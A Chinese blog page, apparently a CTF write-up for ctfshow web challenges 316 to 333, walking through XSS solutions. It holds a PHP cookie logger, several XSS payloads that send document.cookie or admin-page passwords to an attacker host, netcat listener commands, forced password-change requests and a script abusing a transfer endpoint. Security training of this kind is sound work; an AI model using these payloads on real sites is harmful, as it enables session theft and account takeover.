@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web316-web333XSS篇</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/09/20 17:12:51</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h1><p>准备几个XSS注入网站：<br>如<a target="_blank" rel="noopener" href="https://xsshs.cn/%EF%BC%8Chttps://xss.pt/%EF%BC%8Chttp://xsscom.com%E5%8E%BB%E7%94%9F%E6%88%90xss%E9%93%BE%E6%8E%A5">https://xsshs.cn/，https://xss.pt/，http://xsscom.com去生成xss链接</a><br>当然，除此之外，也可以自己编写：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$cookie &#x3D; $_GET[&#39;cookie&#39;];
+$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);
+fwrite($log, $cookie . &quot;\n&quot;);
+fclose($log);
+?&gt;</code></pre>
+<h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>后台bot会自动访问你的连接，我们只需要写一段恶意XSS内容即可。<br>这里用<a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt/</a>进行复现。<br>注册好后，创建项目之后，把获取cookie添加上。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119320621-77e0dee8-617b-4248-a848-74d42e647038.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119451635-6630fbfb-343a-44ed-9546-687032cca715.png" alt="image.png"><br>好像抓到的是自己🤔。<br>那就试一试写在自己的VPS上。</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$cookie &#x3D; $_GET[&#39;cookie&#39;];
+$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);
+fwrite($log, $cookie . &quot;\n&quot;);
+fclose($log);
+?&gt;</code></pre>
+<p>payload：<code>&lt;script&gt;document.location.href=&quot;http://ip/xss.php?cookie=&quot;+document.cookie&lt;/script&gt;</code><br>传入就可以得到需要的flag了：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695124984710-47892421-05e0-4546-83f6-31706a597d5a.png" alt="image.png"></p>
+<h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script，随便换一个标签名称就行了，比如input：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;input onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;natro92.top&#x2F;xss.php?cookie&#x3D;&#39;+document.cookie)&quot; autofocus&gt;</code></pre>
+<p>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</p>
+<h2 id="其他接入方法"><a href="#其他接入方法" class="headerlink" title="其他接入方法"></a>其他接入方法</h2><p>其他的方法：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;svg onload&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;ip&#x2F;&#39;+document.cookie)&quot;&gt;
+&lt;iframe onload&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;ip&#x2F;&#39;+document.cookie)&quot;&gt;&lt;&#x2F;iframe&gt;
+&lt;body onload&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;ip&#x2F;&#39;+document.cookie)&quot;&gt;
+</code></pre>
+<p>用上面这种方法直接用nc接就行，或者python的服务器。</p>
+<pre class="language-php" data-language="php"><code class="language-php">python3 -m http.server 39543</code></pre>
+<h3 id="注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。"><a href="#注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。" class="headerlink" title="注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。"></a>注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。</h3><p>同理，使用nc也是可以达到效果的：</p>
+<pre class="language-php" data-language="php"><code class="language-php">nc -vlp 8888</code></pre>
+<p>payload也就可以简便为：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;input onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;xxx&#x2F;&#39;+document.cookie)&quot; autofocus&gt;</code></pre>
+<p>可能慢一点，多刷新。<br>既然如此，dnslog估计也是可以用的。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126147714-c32fc3cd-7d65-48ae-9e80-43ef0c43a361.png" alt="image.png"></p>
+<h1 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h1><pre class="language-php" data-language="php"><code class="language-php">&lt;input onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;xxx&#x2F;&#39;+document.cookie)&quot; autofocus&gt;</code></pre>
+<h1 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h1><h3 id="过滤掉了空格"><a href="#过滤掉了空格" class="headerlink" title="过滤掉了空格"></a>过滤掉了空格</h3><p>绕过方法：</p>
+<ul>
+<li>TAB</li>
+<li>&#x2F;</li>
+<li>&#x2F;**&#x2F;</li>
+</ul>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;input&#x2F;**&#x2F;onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;xxx&#x2F;&#39;+document.cookie)&quot;&#x2F;**&#x2F;autofocus&gt;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126464239-47f3ca03-ec5d-4961-9b18-3dc47b1c66a4.png" alt="image.png"></p>
+<h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>存储型XSS，还是用之前payload。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695197738252-7c67bfec-c105-456d-9778-42cf8a5000bd.png" alt="image.png"><br>这里需要给admin发信息，意思大概是获取admin的cookie。</p>
+<h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>有个登录页面，但是登不上去，旁边有个注册，注册的用户管理用户名会被管理员检测到。因此将payload放入用户名中。<br>虽然没有flag，但是有cookie，尝试登录一下。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198046512-23757c3e-2857-4e97-bd9d-c5701b0664ed.png" alt="image.png"><br><code>PHPSESSID=7e8jf9pathne9tvgnb02kvj4h9</code><br>在hackbar中传入的cookie是临时的而且没有删除掉本地的cookie，我们需要写到存储中，并删除掉原有cookie值：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198320206-54b159b1-0fc0-4e57-a6d0-e07eea04be56.png" alt="image.png"><br>然后就能看到cookie了。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198380472-3e891c60-8ccc-4786-a7d8-df3e5e448741.png" alt="image.png"></p>
+<h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>直接用之前的方法，得到的cookie是前一次的cookie（管理员打开之后立即退出了登录），cookie刷新了，也就失效了。<br>那直接写段js，使其执行时获取到页面的其他显示密码即可（因为管理员页面是显示密码的。）。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">document.querySelectorAll(&#39;.laytable-cell-1-0-1&#39;).forEach(cell &#x3D;&gt; &#123;
+  if (cell.textContent.startsWith(&#39;ctfshow&#123;&#39;)) &#123;
+    console.log(cell.textContent); 
+    window.open(&#39;http:&#x2F;&#x2F;xxx:8888&#x2F;&#39;+cell.textContent)
+  &#125;
+&#125;);</code></pre>
+<p>这时候我们注册测试一下。<br>为什么会没接到呢。<br>试一试wp的写法：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;
+    if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#39;)&gt;-1)&#123;
+        window.location.href&#x3D;&#39;http:&#x2F;&#x2F;ip&#x2F;a.php?cookie&#x3D;&#39;+value.innerHTML; 
+    &#125;
+&#125;);&lt;&#x2F;script&gt;</code></pre>
+<p>怪了，这种就可以传上去：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199660892-dbce885c-b380-4a11-8983-c83e0530ab79.png" alt="image.png"><br>这里面有文本干扰，所以在末尾添加一个<code>&#123;</code>来定向获取flag。<br>也就是：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;
+    if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;
+        window.location.href&#x3D;&#39;http:&#x2F;&#x2F;xxx:8888&#x2F;&#39;+value.innerHTML; 
+    &#125;
+&#125;);&lt;&#x2F;script&gt;</code></pre>
+<p>这时就能得到flag了。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199955395-f485bb4c-bc69-4c16-b8bf-06f06312e8b5.png" alt="image.png"></p>
+<h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>多了一个修改密码，直接让管理员修改密码即可。查看访问格式：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200054149-497ab670-7c16-4715-b514-55c39f4d48c6.png" alt="image.png"></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php?p&#x3D;admin&#39;;&lt;&#x2F;script&gt;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200186447-11c87ee9-ae07-4e41-baba-a650a282c683.png" alt="image.png"><br>注意，当登录之后访问页面之后就会发现会跳转到修改的页面，手速快点复制下来。</p>
+<h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>与上题类似，但是这里使用的是post：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200377250-37dbc647-5bce-4151-af0a-c34dd3f7936f.png" alt="image.png"><br>修改一下payload即可：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;$.ajax(&#123;url:&#39;api&#x2F;change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;admin&#39;&#125;&#125;);&lt;&#x2F;script&gt;</code></pre>
+<h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>为什么给admin转-99999就变成正的了，有点摸不到头脑<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200578624-04c33805-ec22-4736-8edf-da295212cbc1.png" alt="image.png"></p>
+<h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>自己给自己转可以加钱，什么虚空科技。直接上脚本</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">import requests
+x&#x3D;5
+url&#x3D;&quot;http:&#x2F;&#x2F;e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show&#x2F;api&#x2F;amount.php&quot;
+url2&#x3D;&quot;http:&#x2F;&#x2F;e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show&#x2F;api&#x2F;getFlag.php&quot;
+headers&#x3D;&#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;jkvcavn3fpfel2opl4afqdcepp&#39;&#125;  #自己登录后的sessionid
+while True:
+	print(x)
+	t&#x3D;x-1
+	data&#x3D;&#123;
+	&#39;u&#39;:&#39;user&#39;, #注册的用户名
+	&#39;a&#39;:str(t)
+	&#125;
+	r&#x3D;requests.post(url,headers&#x3D;headers,data&#x3D;data)
+	print(r.text)
+	if(x&gt;10000):
+		r2&#x3D;requests.get(url2,headers&#x3D;headers)
+		print(r2.text)
+		break
+	x+&#x3D;t</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695201085660-c75cae90-a34e-4f7c-9dbd-1dcf457ecd52.png" alt="image.png"></p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/7200c6c5/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web311-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/fc839fed/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web301-web310代码审计</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
